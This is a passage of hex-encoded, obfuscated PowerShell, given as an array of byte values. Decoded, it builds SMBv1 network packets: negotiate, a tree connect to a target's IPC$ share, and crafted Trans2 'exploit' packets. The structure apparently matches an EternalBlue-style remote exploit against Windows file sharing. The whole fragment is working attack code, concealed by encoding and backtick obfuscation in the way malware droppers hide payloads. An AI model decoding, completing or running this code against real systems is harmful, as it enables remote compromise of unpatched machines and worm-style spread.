20,75,73, 65 ,72, '5f',69 ,64,'3d' , 24,73, '6d' , 62 ,68,65, 61 , 64, 65, 72 , '5b' ,32 ,38,'2e' , '2e' ,32 ,39, '5d','3b','d' ,'a', 20, 20 ,20, 20, 20 , 20,20 , 20 ,20,20, 20 ,20, 20 , 20 ,20 ,20 , 20 , 20, '6d' , 75 , '6c' , 74, 69 ,70 , '6c' ,65,78 ,'5f', 69,64, '3d', 24,73,'6d',62, 68 ,65 , 61, 64,65, 72 ,'5b' ,33 , 30,'2e' ,'2e', 33,31 ,'5d' ,'3b' , 'd','a' ,20,20, 20, 20 , 20 ,20 ,20 , 20 , 20,20 ,20, 20,20 ,20 ,20 , 20 ,20, '7d', 'd' , 'a' , 72 ,65, 74,75,72 ,'6e' , 20 ,24,70 , 61,72 , 73,65 , 64, '5f',68 ,65 ,61 , 64,65 , 72 , 'd','a', '7d' , 'd', 'a' ,'d' ,'a' , 66 , 75, '6e',63 , 74 ,69 , '6f', '6e', 20, 73, '6d', 62, 31 ,'5f', 67, 65 ,74,'5f' , 72, 65 , 73 , 70 ,'6f','6e' ,73 , 65 ,38 , 28 ,24 ,73 ,'6f', 63, '6b', 29,'7b' ,'d','a' ,20,20 , 20,20 ,24 , 73,'6f', 63 ,'6b','2e' ,52, 65 , 63,65,69 ,76, 65, 54 , 69 , '6d', 65,'6f' ,75 ,74 ,20 ,'3d' ,35, 30,30 , 30 , 'd' ,'a' , 20 ,20, 20,20 ,24 ,74, 63,70 ,'5f' , 72 ,65 , 73 ,70,'6f','6e', 73 , 65 ,20 , '3d' ,20, '5b', 41, 72,72,61, 79,'5d' , '3a','3a', 43 , 72, 65, 61,74, 65 , 49 ,'6e' ,73 , 74, 61,'6e',63, 65, 28,28 , 27, 62, 27,'2b',27 ,79 ,74 , 65 , 27, 29 , '2c',20 , 31, 30, 32 , 34,29 ,'d' , 'a' ,20 ,20 ,20, 20 , 74, 72 ,79, '7b','d' , 'a', 20,20 , 20 ,20 , 24 ,73, '6f' ,63,'6b','2e', 52 ,65,63, 65 ,69,76 ,65, 28 ,24,74 ,63, 70,'5f', 72 , 65 , 73 ,70 , '6f' ,'6e', 73 ,65, 29 ,'7c' , 20 , '4f',75 ,74 , '2d','6e' , 60 ,55, '6c', '4c' ,'d', 'a',20, 20 ,20, 20,20,'7d','d' , 'a',20 , 20, 20 , 20,20 ,63 ,61 , 74,63, 68 , 20,'7b' ,'d','a',20 , 20,20 ,20 , 20,20,72,65,74 ,75 , 72,'6e', 20 , '2d',31 ,'2c', '2d',31 , 'd' ,'a' ,20 ,20 ,20 , 20 ,20,'7d' ,'d', 'a' ,20,20, 20, 20 ,24, '6e' ,65 ,74, 62 ,69 , '6f' ,73 ,20,'3d' , 20 , 24, 74, 63, 70,'5f' ,72 ,65,73 , 70 , '6f', '6e' , 73,65 , '5b' ,30,'2e' , '2e' ,34,'5d', 'd', 'a', 20 ,20,20 , 20, 24 ,73,'6d',62, '5f', 68,65, 61, 64, 65 ,72 ,38 , 20 , '3d', 20,24,74,63 , 70, '5f' , 72, 65,73, 70 , '6f' ,'6e' , 73,65,'5b' , 34,'2e' ,'2e', 33 ,36,'5d','d' , 'a' , 20,20 ,20 ,20 ,24, 70, 61, 72 ,73 , 65, 64, '5f', 68 ,65 ,61 ,64,65 , 72 ,20,'3d' ,20 ,73 ,'6d', 60 , 42,'5f',68 , 45,61,44, 45, 60 , 52,38 ,28 , 24 , 73, '6d' , 62,'5f', 68 ,65 ,61 ,64,65,72, 38 , 29 , 'd','a' ,20 , 20, 20 , 20 , 72, 65 ,74 ,75, 72 ,'6e' ,20 , 24 ,74 , 63,70 ,'5f',72 , 65 ,73 , 70,'6f' , '6e',73 , 65 ,'2c' , 20,24 ,70 , 61, 72, 73, 65,64 , '5f',68, 65 ,61 , 64 , 65,72 ,'d' ,'a', 'd', 'a' ,'7d','d' , 'a','d' ,'a' ,'d' ,'a' , 66, 75 , '6e', 63, 74, 69 , '6f','6e' ,20 ,63 , '6c' , 69 ,65 , '6e',74 , '5f' , '6e' , 65 ,67 , '6f', 74, 69, 61, 74 , 65 , 38 ,28, 24, 73 , '6f' ,63,'6b', 20,'2c' , 20 ,24, 75, 73 ,65 , '5f' , '6e',74, '6c','6d' ,29,'7b' , 'd' ,'a',20 ,20, 20,20 ,24 , 72,61 ,77, '5f',70 ,72 , '6f' , 74 ,'6f' , 20 , '3d', 20 ,'4e' ,45 ,60 ,67 , '6f', 74, 60 ,49, 61 ,74 , 45, '5f', 50, 60, 52 ,'6f' ,74,'4f', 60, '5f' ,72 ,45 ,51 ,75 ,45 , 73,54,38,28 , 24 , 75,73,65, '5f','6e',74 , '6c' ,'6d', 29,'d','a' , 20 , 20 , 20 , 20, 24,73, '6f' ,63 , '6b' ,'2e' , 53,65 ,'6e' , 64 ,28 , 24, 72,61 ,77 , '5f' , 70, 72, '6f',74 , '6f', 29,20 ,'7c' , 20,'6f',55,54 ,'2d' , 60, '4e' ,60, 55 , '6c' ,'6c', 'd','a',20 ,20, 20 , 20 , 72, 65 ,74 , 75, 72,'6e',20, 53 ,'4d',42 , 31 ,60,'5f',60 ,67,65 , 74 ,'5f' ,72 , 45 ,73 , 60 , 50, '4f' , '4e' ,53,45 ,38,28, 24, 73 , '6f',63 , '6b' ,29 ,'d', 'a' , 'd' ,'a','7d' ,'d' ,'a', 66,75 ,'6e', 63, 74 , 69, '6f','6e' ,20 ,74, 72,65, 65, '5f' ,63, '6f','6e' , '6e',65,63, 74,'5f', 61 ,'6e' , 64, 78, 38 , 28 ,24 ,73 ,'6f' ,63, '6b' ,'2c' , 20, 24 , 74 ,61 ,72 ,67, 65 ,74 , '2c', 20 ,24 , 75, 73 ,65,72, 69 , 64, 29 ,'7b' ,'d','a' ,20, 20, 20 ,20 , 24 ,72 ,61 ,77 , '5f', 70,72, '6f', 74 ,'6f' , 20 , '3d' , 20, 54 ,52 , 65,45 ,'5f' , 63 , '6f', '4e' ,'4e', 60 ,65, 43, 54,'5f' ,61,'6e', 44, 60 ,58 , 60,38, '5f' , 52 , 45,60, 71 , 60 ,55 ,45 ,53,54,20, 24, 74 , 61 , 72 , 67,65 , 74 ,20 ,24 , 75 ,73, 65 , 72,69, 64, 'd' ,'a', 20 , 20,20, 20, 24 ,73, '6f' ,63, '6b' , '2e' , 53, 65 ,'6e' ,64, 28 , 24 ,72, 61,77 , '5f' ,70,72,'6f' ,74 ,'6f',29 ,20 ,'7c' , 20 ,'6f' , 55 ,60 , 54,'2d','6e' , 55 , '4c' ,'6c' , 'd','a',20, 20 ,20,72, 65 , 74,75,72 , '6e' ,20 ,53, '4d', 42, 60 , 31 ,'5f',60,47,45,74 , '5f', 52,60 ,45 , 73 ,70, '4f' , '6e' ,53 ,45,38, 28, 24,73,'6f' , 63 ,'6b',29,'d', 'a' ,'7d','d' ,'a',66,75 , '6e' , 63 ,74 , 69,'6f' ,'6e', 20, 74 ,72 , 65, 65, '5f' , 63 ,'6f' ,'6e','6e',65, 63 , 74 ,'5f' , 61 ,'6e', 64,78,38, '5f' , 72,65, 71,75 , 65, 73, 74, 28,24, 74,61 , 72 ,67 ,65 , 74,'2c', 20, 24,75 ,73 , 65,72 ,69, 64 , 29,20, '7b' , 'd', 'a', 'd','a' , 20 ,20 ,20,20, 20 ,'5b' ,42, 79 ,74 ,65 ,'5b','5d' , '5d' ,20, 24 ,70, '6b' ,74 ,20, '3d' , 20 ,'5b' ,42 ,79 , 74,65, '5b' ,'5d' ,'5d' , 28 , 30 , 78 ,30 ,30, 29,'d','a',20,20,20,20, 20, 24 ,70 ,'6b' , 74 , 20, '2b' , '3d' ,30 ,78,30,30, '2c',30, 78 ,30, 30,'2c' ,30 , 78 , 34,38, 'd' , 'a' ,20 ,20 , 20, 20, 20 , 24 , 70 ,'6b', 74, 20,'2b' , '3d', 30 , 78, 46 , 46 , '2c', 30, 78 , 35 ,33 , '2c',30, 78 ,34,44,'2c', 30, 78, 34, 32, 'd','a' ,20 ,20 ,20,20, 20 , 24,70,'6b',74, 20 , '2b','3d' ,30 ,78,37, 35 ,'d' ,'a' , 20 ,20, 20 , 20 , 20 , 24,70 ,'6b' ,74 , 20,'2b' ,'3d', 30 , 78,30,30, '2c' ,30,78,30 , 30 , '2c' ,30, 78 ,30 ,30 , '2c' ,30,78,30 , 30, 'd' , 'a' , 20,20 ,20,20 ,20,24 ,70 ,'6b' , 74,20, '2b' ,'3d' , 30, 78, 31,38,'d', 'a' , 20 ,20,20 , 20 , 20,24 , 70 , '6b' , 74 ,20 , '2b' ,'3d', 30, 78 , 30,31 ,'2c' ,30, 78 ,34 ,38 , 'd','a' ,20,20,20,20, 20, 24, 70, '6b',74 , 20 , '2b' , '3d',30 ,78, 30, 30,'2c' , 30 ,78 , 30, 30 , 'd' , 'a' , 20, 20 ,20 , 20,20 , 24 ,70, '6b',74, 20,'2b' ,'3d', 30,78 , 30, 30 , '2c', 30,78, 30 , 30,'2c', 30, 78, 30, 30 , '2c' ,30,78, 30 , 30 ,'2c', 30 , 78 , 30 , 30, '2c' , 30,78 ,30,30 , '2c' ,30 ,78,30 , 30, '2c' , 30,78 ,30,30, 'd', 'a', 20,20 ,20 , 20 ,20 ,24 ,70, '6b' ,74,20 ,'2b' , '3d' ,30, 78 , 30 , 30 ,'2c' , 30, 78, 30, 30 , 'd', 'a' , 20,20 ,20 , 20 , 20 ,24,70 ,'6b',74, 20 ,'2b', '3d' , 30 , 78, 66 , 66, '2c' , 30, 78 , 66, 66,'d' ,'a' ,20,20 , 20,20,20, 24 ,70 ,'6b',74, 20 ,'2b' ,'3d', 30 , 78, 32 , 46, '2c',30 , 78 , 34 ,42, 'd' ,'a' ,20,20,20 , 20,20,24,70,'6b' , 74 ,20,'2b','3d', 20 ,24,75,73 , 65, 72 , 69 ,64 , 'd' , 'a' , 20 , 20 ,20, 20 , 20, 24 ,70 ,'6b',74, 20 , '2b','3d' ,30, 78, 30 ,30 ,'2c', 30 , 78 , 30 , 30, 'd','a' ,20 ,20, 20,20,24,69 ,70 ,63,20 , '3d' , 20,28,28 ,27, '6f',41 , 27 ,'2b' ,27 , 49, '6f' , 41,49, 27 , 29,'2d' ,52, 65 ,50 , '4c' , 41 ,43,45 , 27, '6f',41 , 49 , 27 , '2c' , '5b', 63, 68,41, 72 ,'5d' , 39,32 , 29 ,'2b',20,24, 74 , 61,72,67,65, 74,20, '2b' , 20 ,22,'5c' , 49 ,50,43 ,24 ,22, 'd','a' , 20, 20, 20 , 20 ,20 , 24,70 , '6b' , 74,20 ,'2b','3d' , 30,78 , 30, 34, 'd' , 'a' ,20, 20 ,20 , 20,20 ,24 ,70,'6b', 74 , 20, '2b', '3d' , 30 ,78 ,46 , 46, 'd', 'a', 20, 20 , 20,20 , 20, 24 , 70 ,'6b' ,74, 20, '2b','3d', 30 , 78, 30 , 30,'d' , 'a', 20, 20,20 , 20, 20, 24 ,70, '6b' ,74,20 ,'2b' ,'3d' , 30 , 78 , 30, 30 , '2c' ,30 ,78 ,30, 30,'d', 'a',20,20,20 , 20 , 20 , 24 , 70,'6b' ,74,20, '2b' ,'3d',30 , 78 ,30,30, '2c',30 , 78 ,30,30 ,'d' , 'a',20,20 ,20 ,20,20,24 , 70, '6b',74, 20, '2b', '3d' ,30, 78,30, 31,'2c',30 , 78 ,30 ,30,'d', 'a',9 ,20,24 , 61 , '6c' ,'3d', '5b',73,79,73 ,74 , 65,'6d', '2e' ,54 ,65,78 , 74 , '2e',45 ,'6e',63,'6f' , 64,69 , '6e', 67, '5d', '3a' ,'3a',41 , 53, 43, 49 , 49, '2e' ,47 ,65, 74, 42 , 79,74,65 , 73 ,28 ,24 , 69 , 70,63,29, '2e' , 43,'6f', 75 , '6e' , 74 , '2b',38 , 'd' ,'a', 9,20 ,24,70 , '6b' ,74, '2b', '3d','5b' , 62 , 69 ,74,63,'6f','6e',76 ,65, 72, 74 ,65, 72,'5d' , '3a', '3a' ,47, 65 , 74,42 ,79 ,74 , 65, 73 , 28, 24, 61 , '6c',29 , '5b',30 , '5d','2c', 30 , 78, 30 , 30 , 'd' , 'a' ,20 ,20 ,20, 20,20 ,24,70, '6b',74 , 20,'2b' ,'3d',30, 78 ,30, 30 ,'d', 'a' ,20 ,20 , 20,20,20, 24 , 70 ,'6b' , 74 , 20 ,'2b','3d',20 ,'5b' ,73 ,79,73 , 74 ,65, '6d','2e' , 54,65 , 78, 74,'2e' , 45, '6e',63, '6f', 64,69,'6e',67,'5d', '3a','3a', 41, 53 ,43 ,49, 49,'2e' ,47 ,65 ,74 ,42, 79,74, 65 , 73, 28 ,24,69, 70 ,63,29 ,'d','a', 20,20 , 20 ,20, 20,24, 70 ,'6b', 74, 20,'2b' , '3d' ,20 ,30 ,78,30 , 30 , 'd' , 'a' ,20 , 20 , 20,20, 20 , 24 ,70,'6b',74 ,20 , '2b' , '3d' , 20,30 , 78, 33 ,66 ,'2c' , 30 ,78 ,33 ,66 , '2c' ,30, 78, 33 , 66 , '2c',30 , 78, 33,66,'2c' , 30 , 78 , 33,66,'2c' , 30 , 78 ,30 , 30 ,'d' ,'a',9 , 24 ,'6c' ,65 , '6e' ,20 ,'3d' , 20, 24 , 70 ,'6b', 74 ,'2e','4c',65, '6e' ,67 ,74, 68 , 20 ,'2d' ,20 , 34, 'd','a' ,9,24 ,68 , 65 , 78, '6c', 65 ,'6e' ,20 ,'3d' , 20,'5b' ,62,69,74 , 63 , '6f', '6e' ,76, 65,72, 74 , 65,72 , '5d' ,'3a', '3a' ,47, 65, 74,42 , 79,74, 65, 73 ,28 , 24,'6c' ,65,'6e', 29 ,'5b' , '2d', 32, '2e','2e', '2d', 34,'5d','d' ,'a', 9 , 24 , 70 , '6b', 74 , '5b' ,31 , '5d', 20,'3d', 20 , 24,68 , 65 , 78,'6c', 65,'6e','5b' ,30 , '5d' ,'d' ,'a' , 9 , 24,70,'6b', 74,'5b',32,'5d',20 , '3d' ,20 ,24, 68 ,65 , 78,'6c', 65 ,'6e', '5b', 31 , '5d','d' ,'a', 9 , 24 , 70 , '6b', 74 , '5b',33 , '5d',20, '3d', 20,24 , 68, 65 , 78 ,'6c' , 65, '6e', '5b' , 32, '5d' ,'d' ,'a' ,20, 20, 20, 20 ,72,65 ,74 ,75,72 , '6e',20, 24,70, '6b' , 74 , 'd' ,'a',20 , 20 , 20,20, '7d' ,'d','a' , 'd' ,'a' ,66 , 75,'6e' , 63 ,74, 69 , '6f','6e', 20,'6d', 61 , '6b' ,65 , '5f' , 73, '6d' ,62,31 , '5f' ,'6e', 74, '5f',74, 72 ,61 , '6e', 73 , '5f' , 70 , 61,63 , '6b',65, 74,38 ,28,24, 74,72 ,65, 65,'5f',69, 64 ,'2c', 20 , 24, 75,73 ,65 , 72 ,'5f' ,69 , 64,29 , 20 ,'7b' , 'd' ,'a', 'd','a' ,20 ,20,20 , 20 , '5b' ,42 ,79 , 74 , 65, '5b' ,'5d', '5d',20,20, 24 ,70,'6b' , 74 , 20 ,'3d',20 ,'5b' ,42, 79,74,65,'5b','5d','5d', 20 ,28 , 30 ,78, 30 ,30,29 ,'d','a' ,20,20, 20 ,20, 24 , 70,'6b' ,74 , 20, '2b' ,'3d', 20, 30, 78,30 , 30 ,'2c' , 30,78,30 , 38 ,'2c' , 30,78 ,33 , 43, 'd','a' ,20,20 ,20 ,20,24, 70 ,'6b', 74,20, '2b', '3d', 20 ,30 ,78, 66 ,66, '2c',30 , 78 , 35,33,'2c', 30 , 78, 34 ,44 ,'2c' , 30 ,78 ,34,32 ,'d' , 'a' ,20,20 , 20, 20 ,24 ,70, '6b' , 74 ,20, '2b', '3d', 20 ,30, 78 ,61 ,30, 'd', 'a', 20 , 20 ,20,20, 24, 70 , '6b' , 74,20 , '2b','3d',20,30 ,78 , 30, 30,'2c' , 30,78 ,30 ,30,'2c',30,78,30,30 ,'2c' , 30,78, 30 ,30, 'd','a' , 20 , 20 ,20 ,20 ,24,70 , '6b' ,74 , 20,'2b','3d',20,30,78 ,31 , 38 ,'d' , 'a' , 20,20, 20, 20, 24,70 , '6b', 74,20, '2b','3d' , 20, 30, 78 , 30, 31, '2c', 30 ,78 , 34 ,38,'d','a' ,20 ,20 , 20,20,24,70 , '6b' , 74 , 20 , '2b' , '3d', 20, 30 ,78 ,30, 30, '2c' ,30, 78,30 ,30,'d','a' , 20, 20,20,20,24, 70 ,'6b' , 74 , 20,'2b', '3d',20 ,30, 78 , 30,30,'2c',30,78 , 30 , 30 ,'2c' ,30, 78, 30 ,30, '2c' , 30,78 , 30,30 ,'d' , 'a', 20,20 ,20, 20,24,70 , '6b',74,20, '2b','3d' , 20, 30 , 78 ,30 ,30 , '2c' , 30,78 ,30,30 , '2c', 30, 78 , 30,30, '2c', 30 ,78 , 30,30 ,'d' , 'a', 20,20, 20,20, 24 ,70 , '6b',74,20 , '2b','3d' , 20 , 30, 78 , 30, 30,'2c', 30 ,78 , 30, 30 ,'d','a' ,20 , 20,20 , 20,24 , 70,'6b' ,74,20 ,'2b' ,'3d' ,20 ,24,74 , 72 , 65, 65,'5f' ,69 , 64, 'd','a', 20 ,20,20, 20 ,24,70 , '6b' ,74 ,20 , '2b' ,'3d', 20 , 30,78 , 32 , 66, '2c', 30 ,78 ,34,62,'d' ,'a' ,20 , 20 ,20, 20 , 24, 70, '6b', 74,20,'2b', '3d' ,20 , 24,75,73,65 , 72 , '5f',69, 64, 'd','a', 20,20,20, 20 ,24 ,70, '6b' , 74, 20 , '2b' ,'3d',20,30 , 78,30, 30 ,'2c' ,30 , 78 ,30,30 ,'d' , 'a' , 'd','a' ,20 ,20 , 20, 20 , 24, 70 , '6b',74 , 20 , '2b' , '3d' , 20,30,78, 31,34 ,'d', 'a' ,20 , 20 , 20,20 , 24 , 70 , '6b' ,74 ,20 , '2b' , '3d', 20 , 30,78,30,31 ,'d', 'a', 20,20,20 ,20, 24, 70 , '6b', 74 , 20,'2b','3d' , 20 ,30 , 78, 30, 30, '2c' , 30 ,78 , 30,30 ,'d','a' , 20 , 20,20,20 ,24, 70 , '6b' ,74, 20 ,'2b','3d', 20, 30, 78 ,31 ,65,'2c', 30,78 , 30 , 30,'2c',30, 78,30 , 30 , '2c' ,30 , 78,30 , 30, 'd', 'a' ,20, 20 , 20 ,20, 24, 70 , '6b' , 74 , 20 ,'2b' ,'3d' ,20, 30, 78 , 34,39, '2c' ,30 , 78 , 30,31, '2c', 30, 78, 30 , 31 , '2c',30 ,78,30 ,30 , 'd','a' , 20, 20 , 20 ,20 ,24 , 70 , '6b',74, 20,'2b','3d', 20, 30, 78, 31 ,65 , '2c', 30 ,78 ,30 ,30,'2c' , 30,78 , 30 , 30 , '2c', 30 , 78, 30,30 ,'d', 'a', 20 , 20, 20, 20, 24 ,70, '6b', 74,20,'2b','3d',20 , 30,78, 30 , 30, '2c' , 30 , 78 ,30,30 , '2c', 30,78 , 30 ,30 ,'2c',30,78 , 30 , 30 ,'d', 'a' ,20, 20,20,20 ,24 ,70 ,'6b',74, 20, '2b', '3d' , 20 ,30 ,78,31, 65, '2c', 30 , 78, 30 ,30,'2c',30,78 ,30 , 30 ,'2c', 30, 78 , 30 , 30,'d','a',20, 20 , 20,20,24, 70,'6b' ,74,20, '2b' , '3d',20,30 ,78 ,34, 63 ,'2c', 30 ,78, 30 , 30,'2c', 30 ,78 , 30, 30, '2c',30 , 78, 30 , 30 ,'d' ,'a', 20, 20,20 ,20,24, 70,'6b', 74 ,20, '2b' ,'3d',20, 30 , 78,34 ,39,'2c' , 30 , 78, 30 ,31, '2c' , 30, 78 , 30, 30 ,'2c', 30 ,78 , 30, 30,'d','a' ,20,20 , 20 ,20 ,24 ,70 ,'6b', 74 ,20,'2b', '3d' , 20 , 30, 78 , 36,63 , '2c',30 , 78,30 ,30 ,'2c' ,30 , 78,30 , 30 ,'2c' , 30, 78 ,30,30 , 'd','a', 20 , 20, 20 , 20,24 ,70 , '6b' , 74 , 20 ,'2b' , '3d' , 20 , 30, 78,30,31, 'd', 'a' ,20,20 , 20 ,20,24, 70 ,'6b' ,74,20 ,'2b' , '3d', 20 , 30, 78, 30,30, '2c' ,30, 78 , 30, 30,'d','a', 20, 20 ,20, 20,24, 70,'6b' , 74, 20, '2b','3d',20 ,30,78 , 30 ,30, '2c' ,30 ,78, 30 , 30,'d','a' ,20, 20,20 ,20, 24,70,'6b', 74,20, '2b','3d' , 20 ,30,78, 36 ,61,'2c', 30 , 78, 30,31, 'd','a',20 , 20 ,20, 20,24 , 70,'6b' , 74 , 20 ,'2b', '3d' ,20, 30,78 , 66,66 ,'d' ,'a', 20,20, 20 ,20,24 , 70 ,'6b' , 74,20 ,'2b', '3d' , 20,'5b' , 42 , 79 ,74, 65, '5b', '5d', '5d', 20, 28, 30,78 , 30,30 ,29,20 ,'2a' , 20,30 , 78 ,31,65,'d' , 'a',20 , 20, 20,20 ,24 ,70 ,'6b' , 74 ,20, '2b', '3d', 20,30 , 78 , 66 ,66, '2c' , 30 ,78 , 66 ,66 ,'2c' ,30 , 78 ,30, 30 , '2c',30 ,78, 30,30,'2c',30 , 78 ,30 ,31,'d', 'a', 20, 20, 20 ,20, 24, 70, '6b' ,74, 20 ,'2b', '3d' ,20 , '5b', 42, 79 ,74 ,65, '5b','5d','5d' ,28 , 30, 78,30 , 30, 29 , 20,'2a',20 ,30,78 ,31, 34,36,'d', 'a', 20 , 20 ,20,20,24, '6c', 65, '6e',20 , '3d', 20, 24,70,'6b', 74,'2e', '4c' , 65,'6e',67 ,74 ,68 , 20,'2d' , 20, 34, 'd' ,'a',20, 20,20 ,20 ,24 , 68 , 65,78,'6c' ,65,'6e' , 20,'3d' , 20 ,'5b' ,62,69, 74 ,63,'6f' , '6e' , 76 , 65 ,72, 74 ,65 ,72 ,'5d', '3a','3a' , 47, 65 , 74,42,79,74 , 65,73, 28,24 ,'6c' ,65, '6e' , 29,'5b' , '2d', 32 , '2e' , '2e' ,'2d',34,'5d' ,'d' , 'a' , 20 , 20, 20 , 20 , 24 ,70 ,'6b', 74 ,'5b' ,31,'5d', 20,'3d' , 20 , 24,68 , 65,78,'6c',65, '6e' , '5b' , 30 , '5d' ,'d', 'a' , 20, 20 , 20 , 20 ,24,70, '6b' , 74, '5b',32, '5d' ,20,'3d',20,24 ,68 , 65, 78 , '6c' ,65,'6e' , '5b',31 ,'5d','d', 'a',20 , 20, 20 ,20 ,24 , 70 ,'6b', 74,'5b' ,33 ,'5d', 20 ,'3d' ,20,24 ,68,65, 78 ,'6c', 65,'6e', '5b',32 , '5d','d', 'a', 20,20 ,20,20 ,72 , 65, 74 , 75 ,72 ,'6e' , 20,24 ,70, '6b' , 74 , 'd','a',20 , 20, '7d', 'd','a','d', 'a' , 66 , 75, '6e', 63 , 74 , 69 , '6f' , '6e' ,20,'6d' ,61, '6b' , 65, '5f' , 73,'6d', 62 ,31 , '5f', 74 ,72 ,61 , '6e',73 ,32 ,'5f',65 ,78,70 ,'6c' , '6f' , 69 , 74 , '5f', 70, 61,63, '6b' ,65 , 74,38,28 , 24,74 , 72 ,65 , 65, '5f' ,69 ,64, '2c' , 20,24, 75, 73, 65,72, '5f' ,69, 64,'2c',20,24 , 64 ,61 ,74 , 61 , '2c' , 20, 24 , 74, 69,'6d',65,'6f' ,75 ,74 ,29 ,20,'7b','d', 'a','d','a',20 ,20 ,20,20,24 ,74, 69, '6d' ,65,'6f', 75 ,74,20, '3d' , 20 ,28, 24 ,74 ,69, '6d', 65 ,'6f' ,75 ,74, 20, '2a', 20 ,30,78, 31 ,30 , 29, 20 , '2b', 20, 31,'d','a' , 20 ,20 , 20, 20 , '5b' , 42, 79 ,74 ,65 ,'5b' ,'5d', '5d', 20, 20, 24 , 70, '6b',74, 20,'3d' ,20, '5b' ,42 ,79,74 , 65,'5b' , '5d' ,'5d',20,28 ,30,78 ,30, 30 ,29, 'd' , 'a' , 20 ,20 , 20,20, 24,70 , '6b', 74,20 ,'2b' , '3d', 20 , 30, 78, 30 , 30 , '2c',30 ,78 ,31 , 30,'2c' , 30 ,78,33 ,38 , 'd' ,'a' , 20 ,20, 20, 20, 24 , 70 , '6b' , 74 ,20, '2b' ,'3d' , 20 , 30 , 78 ,66 ,66, '2c',30 , 78,35 , 33 , '2c' , 30 ,78, 34, 44 ,'2c' , 30 , 78 ,34 ,32 , 'd' ,'a',20 ,20, 20 ,20, 24,70, '6b', 74,20 , '2b' ,'3d', 20 , 30 ,78, 33 ,33 , 'd' ,'a' ,20, 20, 20 , 20 ,24 ,70, '6b' , 74, 20,'2b','3d' ,20, 30, 78 ,30, 30,'2c' , 30, 78,30 ,30, '2c',30 ,78 , 30, 30 , '2c', 30, 78, 30, 30,'d' , 'a', 20, 20,20 , 20 ,24,70 , '6b' ,74, 20,'2b', '3d' ,20, 30, 78 ,31,38 ,'d', 'a' ,20,20, 20, 20,24, 70,'6b' , 74 ,20 ,'2b' ,'3d' , 20 , 30 ,78,30 , 31, '2c',30 , 78 ,34 ,38, 'd' , 'a' , 20,20 , 20 ,20 , 24 , 70 , '6b',74 ,20 ,'2b' ,'3d', 20,30 , 78, 30, 30, '2c' ,30 , 78 ,30,30 , 'd' , 'a',20,20, 20 , 20 , 24 , 70, '6b', 74, 20 , '2b' , '3d' , 20, 30, 78, 30 , 30, '2c',30, 78 , 30 ,30, '2c' , 30, 78 ,30 ,30,'2c' ,30 , 78, 30,30 , 'd' ,'a',20,20, 20,20 ,24 ,70 ,'6b' , 74,20 ,'2b' , '3d' , 20, 30 ,78 , 30 ,30,'2c' ,30 , 78, 30 ,30 , '2c', 30 , 78,30, 30, '2c' ,30, 78,30, 30, 'd' ,'a' , 20,20, 20 ,20 ,24 , 70,'6b', 74, 20, '2b','3d', 20, 30, 78 ,30, 30 ,'2c',30 ,78 ,30 , 30, 'd', 'a' , 20,20 ,20 ,20, 24 ,70,'6b' ,74,20, '2b','3d' , 20, 24 ,74, 72 ,65, 65 ,'5f' ,69, 64 ,'d' , 'a' , 20,20, 20,20, 24 , 70, '6b',74, 20 ,'2b','3d',20 , 30 ,78,32,66, '2c' , 30 , 78,34,62 , 'd', 'a' ,20, 20, 20, 20,24 ,70,'6b' , 74, 20 ,'2b', '3d', 20,24, 75 ,73,65,72, '5f', 69 ,64 , 'd', 'a', 20, 20,20, 20 , 24, 70, '6b' ,74,20, '2b', '3d', 20 , 30, 78 , 30, 30 ,'2c', 30 , 78 , 30 , 30, 'd' , 'a','d', 'a' ,20,20 ,20,20,24 , 70 ,'6b' ,74,20 , '2b' , '3d' , 20 ,30, 78 , 30 , 39 , 'd' ,'a' , 20 , 20 ,20, 20,24, 70, '6b',74 , 20, '2b' ,'3d' , 20, 30 , 78 , 30,30 ,'2c', 30,78, 30 ,30,'d' , 'a' ,20 ,20, 20 ,20 ,24 ,70 , '6b' , 74 ,20,'2b' , '3d',20 ,30 ,78 ,30,30,'2c' , 30 ,78 , 31 ,30,'d','a',20 , 20,20 ,20, 24, 70, '6b',74 , 20, '2b' , '3d', 20 , 30 , 78 ,30 ,30 ,'2c',30,78 ,30, 30,'d' , 'a', 20, 20 ,20 , 20,24 ,70 ,'6b', 74 , 20, '2b', '3d',20, 30 , 78, 30 , 30 , '2c' , 30,78 , 30, 30 ,'d' , 'a', 20 ,20 , 20 ,20,24 ,70 ,'6b' , 74 , 20, '2b' ,'3d',20 , 30 ,78 , 30 , 30 , 'd' , 'a' ,20 , 20,20 , 20, 24 , 70 ,'6b', 74 , 20,'2b' , '3d',20 , 30 , 78,30 , 30 , 'd','a' ,20,20 , 20, 20, 24 , 70,'6b' ,74,20,'2b', '3d' , 20 ,30,78,30 , 30 ,'2c', 30, 78 , 31, 30 , 'd','a', 20, 20,20 , 20, 24, 70 , '6b', 74,20,'2b','3d',20 ,30,78, 33 , 38 ,'2c',30, 78, 30, 30,'2c' , 30 , 78, 34,39 , 'd' , 'a' , 20 ,20,20 , 20 ,24 , 70,'6b', 74, 20 , '2b' ,'3d',20 , '5b' , 62 , 69 , 74, 63, '6f' , '6e', 76,65 , 72,74,65,72, '5d', '3a', '3a' , 47 ,65, 74 ,42 ,79, 74, 65,73,28, 24,74,69 ,'6d', 65,'6f' , 75 , 74 , 29,'5b' , 30,'5d','d', 'a', 20,20,20 , 20, 24,70 ,'6b' ,74, 20, '2b', '3d' ,20,30, 78, 30, 30 ,'2c', 30,78 ,30,30 ,'d','a' ,20,20,20,20, 24, 70 , '6b' , 74,20 , '2b' ,'3d',20,30,78, 30, 33, '2c' ,30 , 78, 31,30, 'd','a', 'd','a',20,20 , 20 ,20,24, 70 , '6b' , 74,20,'2b','3d',20 ,30 ,78,66,66 , '2c' , 30,78,66 , 66, '2c' ,30 ,78, 66 ,66,'d' ,'a' , 20, 20 , 20, 20,24 ,70 , '6b', 74, 20 ,'2b' ,'3d' , 24 ,64, 61 , 74 , 61 , 'd' ,'a' ,20, 20 , 20 ,20 , 24,'6c', 65, '6e' , 20,'3d', 20 ,24 , 70 ,'6b',74, '2e' , '4c',65 ,'6e',67,74 , 68,20,'2d' , 20 , 34 , 'd' , 'a' , 20,20,20, 20, 24 ,68 ,65 ,78, '6c' , 65,'6e' , 20 ,'3d',20 , '5b' , 62,69 , 74 ,63 ,'6f' , '6e' , 76, 65, 72,74, 65 , 72 , '5d', '3a' , '3a' ,47 , 65,74, 42 , 79 , 74 ,65 , 73 ,28 , 24, '6c' , 65 ,'6e' , 29 ,'5b' ,'2d',32 , '2e','2e' , '2d' ,34,'5d' ,'d' ,'a',20 ,20,20 , 20, 24 , 70 ,'6b' ,74,'5b', 31,'5d' , 20, '3d',20,24,68 , 65 ,78, '6c',65,'6e' , '5b', 30 , '5d' , 'd', 'a' ,20 ,20 ,20 , 20,24 ,70,'6b',74, '5b' 